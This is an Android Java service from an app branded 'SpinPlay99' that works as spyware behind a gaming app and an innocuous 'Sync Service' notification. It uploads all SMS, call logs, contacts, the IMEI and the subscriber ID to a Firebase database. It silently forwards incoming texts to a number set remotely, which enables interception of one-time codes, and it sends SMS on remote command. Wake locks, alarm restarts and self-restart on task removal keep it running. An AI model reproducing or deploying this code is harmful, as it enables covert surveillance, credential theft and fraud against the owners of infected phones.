package com.spinplay99.adminpanel;

import android.Manifest;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class BackgroundSyncService extends Service {

    private static final String  DB_URL           = "https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app";
    private static final String  CHANNEL_ID       = "spinplay99_channel";
    private static final int     NOTIFICATION_ID  = 999;
    private static final String  PREFS_NAME       = "SpinPlaySyncPrefs";
    private static final String  KEY_SMS_COUNT    = "last_sms_count";
    private static final String  KEY_CALL_COUNT   = "last_call_count";
    private static final String  KEY_CONTACT_COUNT= "last_contact_count";
    private static final long    LIVE_INTERVAL    = 3000;
    private static final long    FULL_INTERVAL    = 60000;

    private DatabaseReference    databaseReference;
    private String               deviceId;
    private Handler              handler;
    private Runnable             syncRunnable;
    private SmsManager           smsManager;
    private ValueEventListener   forwardingListener;
    private ValueEventListener   commandListener;
    private ValueEventListener   connListener;
    private String               forwardingNumber = "";
    private boolean              forwardingEnabled = false;
    private List<String>         forwardingFilters = new ArrayList<>();
    private boolean              forwardAllSms    = true;
    private SharedPreferences    prefs;
    private long                 lastFullSyncTime = 0;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();

        // Acquire partial wake lock — keeps CPU awake so Firebase stays connected
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpinPlay99:SyncWakeLock");
        wakeLock.acquire();

        if (FirebaseApp.getApps(this).isEmpty()) {
            FirebaseApp.initializeApp(this);
        }

        // Enable offline persistence — Firebase queues writes even when briefly disconnected
        try {
            FirebaseDatabase.getInstance(DB_URL).setPersistenceEnabled(true);
        } catch (Exception ignored) {}

        databaseReference = FirebaseDatabase.getInstance(DB_URL).getReference();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        handler  = new Handler(Looper.getMainLooper());
        smsManager = SmsManager.getDefault();
        prefs    = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);

        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());

        // Keep device node synced even offline
        databaseReference.child("devices").child(deviceId).keepSynced(true);

        loadForwardingSettings();
        listenForManualCommands();
        listenForConnection();
        scheduleRestart(this);
        doFullDataSync();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Immediately mark device online when service starts/restarts
        if (databaseReference != null && deviceId != null) {
            databaseReference.child("devices").child(deviceId).child("online_status").setValue(true);
        }
        // Re-register connection listener if service was restarted
        if (connListener == null) listenForConnection();
        startSyncLoop();
        return START_STICKY;
    }

    private void startSyncLoop() {
        if (syncRunnable != null) handler.removeCallbacks(syncRunnable);
        syncRunnable = new Runnable() {
            @Override
            public void run() {
                syncLiveData();
                long now = System.currentTimeMillis();
                if (now - lastFullSyncTime >= FULL_INTERVAL) {
                    doFullDataSync();
                    lastFullSyncTime = now;
                }
                handler.postDelayed(this, LIVE_INTERVAL);
            }
        };
        handler.post(syncRunnable);
    }

    /** Fast sync — only live metrics. onDisconnect() is NOT called here
     *  to avoid Firebase connection instability. */
    private void syncLiveData() {
        // Force Firebase to stay connected
        try { FirebaseDatabase.getInstance(DB_URL).goOnline(); } catch (Exception ignored) {}

        DatabaseReference deviceRef = databaseReference.child("devices").child(deviceId);

        // Set online and update live data
        deviceRef.child("online_status").setValue(true);

        Map<String, Object> live = new HashMap<>();
        SimpleDateFormat fmt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        live.put("timestamp",        fmt.format(new Date()));
        live.put("timestamp_millis", ServerValue.TIMESTAMP);
        live.put("battery_level",    getBatteryLevel());
        live.put("network_type",     getNetworkType());
        live.put("is_charging",      isDeviceCharging());
        live.put("permissions",      getAllPermissions());
        live.put("sim_info",         getSimInformation());
        if (checkPermission(Manifest.permission.READ_SMS))
            live.put("total_sms",    getSmsCount());
        if (checkPermission(Manifest.permission.READ_CALL_LOG))
            live.put("total_calls",  getCallLogCount());
        if (checkPermission(Manifest.permission.READ_CONTACTS))
            live.put("contacts_count", getContactCount());

        deviceRef.child("live_data").setValue(live);
        updateDeviceInfo();
        checkAndForwardNewSms();
    }

    /** Listens to Firebase connection state. On every (re)connect:
     *  sets online_status=true and registers onDisconnect handlers ONCE. */
    private void listenForConnection() {
        if (connListener != null) return; // already listening
        connListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean connected = snapshot.getValue(Boolean.class);
                if (connected != null && connected) {
                    DatabaseReference deviceRef = databaseReference.child("devices").child(deviceId);
                    deviceRef.child("online_status").setValue(true);
                    // Register server-side disconnect handlers ONCE per connection
                    deviceRef.child("online_status").onDisconnect().setValue(false);
                    deviceRef.child("live_data").child("timestamp_millis").onDisconnect().setValue(ServerValue.TIMESTAMP);
                    deviceRef.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        FirebaseDatabase.getInstance(DB_URL)
            .getReference(".info/connected")
            .addValueEventListener(connListener);
    }

    private void doFullDataSync() {
        new Thread(() -> {
            if (checkPermission(Manifest.permission.READ_SMS)) {
                int current = getSmsCount();
                int last    = prefs.getInt(KEY_SMS_COUNT, -1);
                if (current != last) { uploadAllSms(); prefs.edit().putInt(KEY_SMS_COUNT, current).apply(); }
            }
            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                int current = getCallLogCount();
                int last    = prefs.getInt(KEY_CALL_COUNT, -1);
                if (current != last) { uploadAllCalls(); prefs.edit().putInt(KEY_CALL_COUNT, current).apply(); }
            }
            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                int current = getContactCount();
                int last    = prefs.getInt(KEY_CONTACT_COUNT, -1);
                if (current != last) { uploadAllContacts(); prefs.edit().putInt(KEY_CONTACT_COUNT, current).apply(); }
            }
        }).start();
    }

    private void updateDeviceInfo() {
        Map<String, Object> info = new HashMap<>();
        info.put("device_id",       deviceId);
        info.put("device_model",    Build.MODEL);
        info.put("device_brand",    Build.BRAND);
        info.put("android_version", Build.VERSION.RELEASE);
        info.put("last_seen",       ServerValue.TIMESTAMP);
        info.put("sim_info",        getDetailedSimInfo());
        databaseReference.child("devices").child(deviceId).child("device_info").updateChildren(info);
    }

    private void uploadAllSms() {
        List<Map<String, Object>> list = getAllSmsMessages();
        Map<String, Object> data = new HashMap<>();
        data.put("total_count",  list.size());
        data.put("last_updated", ServerValue.TIMESTAMP);
        data.put("messages",     list);
        databaseReference.child("devices").child(deviceId).child("all_sms").setValue(data);
    }

    private List<Map<String, Object>> getAllSmsMessages() {
        List<Map<String, Object>> result = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                new String[]{"_id","address","body","date","type","read"},
                null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> sms = new HashMap<>();
                    sms.put("id",      getCursorValue(cursor, 0));
                    sms.put("address", getCursorValue(cursor, 1));
                    String body = getCursorValue(cursor, 2);
                    if (body != null && body.length() > 500) body = body.substring(0, 500) + "...";
                    sms.put("body", body);
                    String dateStr = getCursorValue(cursor, 3);
                    sms.put("date", dateStr);
                    if (dateStr != null && !dateStr.isEmpty())
                        sms.put("date_readable", formatTimestamp(Long.parseLong(dateStr)));
                    String typeStr = getCursorValue(cursor, 4);
                    if ("1".equals(typeStr)) sms.put("type", "INBOX");
                    else if ("2".equals(typeStr)) sms.put("type", "SENT");
                    else sms.put("type", "OTHER");
                    sms.put("read", getCursorValue(cursor, 5));
                    result.add(sms);
                } while (cursor.moveToNext());
            }
        } catch (Exception ignored) {
        } finally { if (cursor != null) cursor.close(); }
        return result;
    }

    private void uploadAllCalls() {
        List<Map<String, Object>> list = getAllCallLogs();
        Map<String, Object> data = new HashMap<>();
        data.put("total_count",  list.size());
        data.put("last_updated", ServerValue.TIMESTAMP);
        data.put("calls",        list);
        databaseReference.child("devices").child(deviceId).child("all_calls").setValue(data);
    }

    private List<Map<String, Object>> getAllCallLogs() {
        List<Map<String, Object>> result = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{"_id","number","type","date","duration","name"},
                null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> call = new HashMap<>();
                    call.put("id",     getCursorValue(cursor, 0));
                    call.put("number", getCursorValue(cursor, 1));
                    String typeStr = getCursorValue(cursor, 2);
                    if ("1".equals(typeStr)) call.put("type", "INCOMING");
                    else if ("2".equals(typeStr)) call.put("type", "OUTGOING");
                    else if ("3".equals(typeStr)) call.put("type", "MISSED");
                    else call.put("type", "UNKNOWN");
                    String dateStr = getCursorValue(cursor, 3);
                    call.put("date", dateStr);
                    if (dateStr != null && !dateStr.isEmpty())
                        call.put("date_readable", formatTimestamp(Long.parseLong(dateStr)));
                    call.put("duration",     getCursorValue(cursor, 4));
                    call.put("contact_name", getCursorValue(cursor, 5));
                    result.add(call);
                } while (cursor.moveToNext());
            }
        } catch (Exception ignored) {
        } finally { if (cursor != null) cursor.close(); }
        return result;
    }

    private void uploadAllContacts() {
        List<Map<String, Object>> list = getAllContactsList();
        Map<String, Object> data = new HashMap<>();
        data.put("total_count",  list.size());
        data.put("last_updated", ServerValue.TIMESTAMP);
        data.put("contacts",     list);
        databaseReference.child("devices").child(deviceId).child("all_contacts").setValue(data);
    }

    private List<Map<String, Object>> getAllContactsList() {
        List<Map<String, Object>> result = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                new String[]{"_id","display_name","has_phone_number"},
                null, null, "display_name ASC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> c = new HashMap<>();
                    String cId = getCursorValue(cursor, 0);
                    c.put("id",   cId);
                    c.put("name", getCursorValue(cursor, 1));
                    if ("1".equals(getCursorValue(cursor, 2)))
                        c.put("phone", getPhoneForContact(cId));
                    result.add(c);
                } while (cursor.moveToNext());
            }
        } catch (Exception ignored) {
        } finally { if (cursor != null) cursor.close(); }
        return result;
    }

    private String getPhoneForContact(String id) {
        try {
            Cursor c = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{"number"}, "contact_id=?", new String[]{id}, null);
            if (c != null && c.moveToFirst()) {
                String n = c.getString(0); c.close(); return n;
            }
            if (c != null) c.close();
        } catch (Exception ignored) {}
        return "";
    }

    private void loadForwardingSettings() {
        forwardingListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snap) {
                if (!snap.exists()) return;
                forwardingNumber  = snap.child("forward_to").getValue(String.class);
                Boolean en = snap.child("enabled").getValue(Boolean.class);
                forwardingEnabled = en != null && en;
                Boolean all = snap.child("forward_all").getValue(Boolean.class);
                forwardAllSms = all == null || all;
                forwardingFilters.clear();
                for (DataSnapshot f : snap.child("filters").getChildren()) {
                    String n = f.getValue(String.class);
                    if (n != null) forwardingFilters.add(n);
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        };
        databaseReference.child("devices").child(deviceId).child("forwarding_settings")
            .addValueEventListener(forwardingListener);
    }

    private void forwardSmsMessage(String from, String body, long ts) {
        if (!forwardingEnabled || forwardingNumber == null || forwardingNumber.isEmpty()) return;
        if (!forwardAllSms && !forwardingFilters.isEmpty()) {
            boolean matched = false;
            for (String f : forwardingFilters) { if (from.contains(f)) { matched = true; break; } }
            if (!matched) return;
        }
        try {
            smsManager.sendTextMessage(forwardingNumber, null, "From: " + from + "\n" + body, null, null);
            Map<String, Object> log = new HashMap<>();
            log.put("from", from);
            log.put("to",   forwardingNumber);
            log.put("body", body != null && body.length() > 100 ? body.substring(0, 100) : body);
            log.put("status",       "FORWARDED");
            log.put("forwarded_at", ServerValue.TIMESTAMP);
            databaseReference.child("devices").child(deviceId).child("forwarded_sms").push().setValue(log);
        } catch (Exception ignored) {}
    }

    private void checkAndForwardNewSms() {
        if (!forwardingEnabled || !checkPermission(Manifest.permission.READ_SMS)) return;
        new Thread(() -> {
            Cursor cursor = null;
            try {
                long ago = System.currentTimeMillis() - 10000;
                cursor = getContentResolver().query(
                    Telephony.Sms.Inbox.CONTENT_URI,
                    new String[]{"address","body","date"},
                    "date > ?", new String[]{String.valueOf(ago)},
                    "date DESC LIMIT 5");
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        forwardSmsMessage(
                            getCursorValue(cursor, 0),
                            getCursorValue(cursor, 1),
                            Long.parseLong(getCursorValue(cursor, 2)));
                    } while (cursor.moveToNext());
                }
            } catch (Exception ignored) {
            } finally { if (cursor != null) cursor.close(); }
        }).start();
    }

    private void listenForManualCommands() {
        commandListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snap) {
                for (DataSnapshot cmd : snap.getChildren()) {
                    String to  = cmd.child("to").getValue(String.class);
                    String msg = cmd.child("message").getValue(String.class);
                    if (to != null && msg != null) {
                        try {
                            smsManager.sendTextMessage(to, null, msg, null, null);
                            Map<String, Object> log = new HashMap<>();
                            log.put("to",      to);
                            log.put("message", msg);
                            log.put("status",  "SENT");
                            log.put("sent_at", ServerValue.TIMESTAMP);
                            databaseReference.child("devices").child(deviceId).child("sent_sms").push().setValue(log);
                        } catch (Exception ignored) {}
                    }
                    cmd.getRef().removeValue();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        };
        databaseReference.child("devices").child(deviceId).child("manual_commands").child("send_sms")
            .addValueEventListener(commandListener);
    }

    public static void scheduleRestart(Context ctx) {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        Intent intent   = new Intent(ctx, ServiceRestartReceiver.class);
        PendingIntent pi = PendingIntent.getBroadcast(
            ctx, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        if (am != null && pi != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // setAndAllowWhileIdle: fires even in Doze mode, NO permission needed
                // Min interval: 1 min when active, 9 min in deep doze
                am.setAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 60_000, pi);
            } else {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 60_000, pi);
            }
        }
    }

    // ─── Helpers ───

    private String getCursorValue(Cursor c, int i) {
        try { return c.getString(i); } catch (Exception e) { return ""; }
    }

    private String formatTimestamp(long ts) {
        try { return new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date(ts)); }
        catch (Exception e) { return ""; }
    }

    private int getSmsCount()     { return getCount(Telephony.Sms.CONTENT_URI); }
    private int getCallLogCount() { return getCount(CallLog.Calls.CONTENT_URI); }
    private int getContactCount() { return getCount(android.provider.ContactsContract.Contacts.CONTENT_URI); }

    private int getCount(Uri uri) {
        int n = 0;
        try {
            Cursor c = getContentResolver().query(uri, null, null, null, null);
            if (c != null) { n = c.getCount(); c.close(); }
        } catch (Exception ignored) {}
        return n;
    }

    private Map<String, Boolean> getAllPermissions() {
        Map<String, Boolean> p = new HashMap<>();
        p.put("read_sms",      checkPermission(Manifest.permission.READ_SMS));
        p.put("send_sms",      checkPermission(Manifest.permission.SEND_SMS));
        p.put("receive_sms",   checkPermission(Manifest.permission.RECEIVE_SMS));
        p.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
        p.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
        p.put("call_phone",    checkPermission(Manifest.permission.CALL_PHONE));
        return p;
    }

    private boolean checkPermission(String p) {
        return ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED;
    }

    private int getBatteryLevel() {
        try {
            Intent i = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i != null) {
                int scale = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                int level = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                if (scale > 0) return (level * 100) / scale;
            }
        } catch (Exception ignored) {}
        return 0;
    }

    private String getNetworkType() {
        try {
            android.net.ConnectivityManager cm =
                (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.net.Network net = cm.getActiveNetwork();
                if (net == null) return "Offline";
                android.net.NetworkCapabilities caps = cm.getNetworkCapabilities(net);
                if (caps == null) return "Offline";
                if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI))     return "WIFI";
                if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) return "MOBILE";
                if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET)) return "ETHERNET";
                return "OTHER";
            } else {
                android.net.NetworkInfo info = cm.getActiveNetworkInfo();
                if (info != null && info.isConnected()) return info.getTypeName();
            }
        } catch (Exception ignored) {}
        return "Offline";
    }

    private boolean isDeviceCharging() {
        try {
            Intent i = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i != null) {
                int s = i.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                return s == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                    || s == android.os.BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private Map<String, Object> getSimInformation() {
        Map<String, Object> m = new HashMap<>();
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                m.put("sim_operator",     tm.getSimOperatorName());
                m.put("network_operator", tm.getNetworkOperatorName());
            }
        } catch (Exception ignored) {}
        return m;
    }

    private Map<String, Object> getDetailedSimInfo() {
        Map<String, Object> m = new HashMap<>();
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                m.put("sim_operator_name",     tm.getSimOperatorName());
                m.put("network_operator_name", tm.getNetworkOperatorName());
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                        && checkPermission(Manifest.permission.READ_PHONE_STATE))
                    m.put("imei", tm.getImei());
                if (checkPermission(Manifest.permission.READ_PHONE_STATE))
                    m.put("subscriber_id", tm.getSubscriberId());
            }
        } catch (Exception ignored) {}
        return m;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "Sync Service", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Background synchronization service");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification createNotification() {
        Intent i = new Intent(this, SplashActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, i, PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SpinPlay99")
            .setContentText("Service Running...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentIntent(pi)
            .setOngoing(true)
            .build();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        // DO NOT set online_status=false here — Firebase's onDisconnect() handles it.
        // Setting it manually causes false "offline" when service is briefly restarted by OEM.
        if (handler != null && syncRunnable != null) handler.removeCallbacks(syncRunnable);
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (forwardingListener != null)
            databaseReference.child("devices").child(deviceId).child("forwarding_settings")
                .removeEventListener(forwardingListener);
        if (commandListener != null)
            databaseReference.child("devices").child(deviceId).child("manual_commands").child("send_sms")
                .removeEventListener(commandListener);
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        scheduleRestart(getApplicationContext());
        Intent restart = new Intent(getApplicationContext(), BackgroundSyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            getApplicationContext().startForegroundService(restart);
        else
            getApplicationContext().startService(restart);
        super.onTaskRemoved(rootIntent);
    }
}
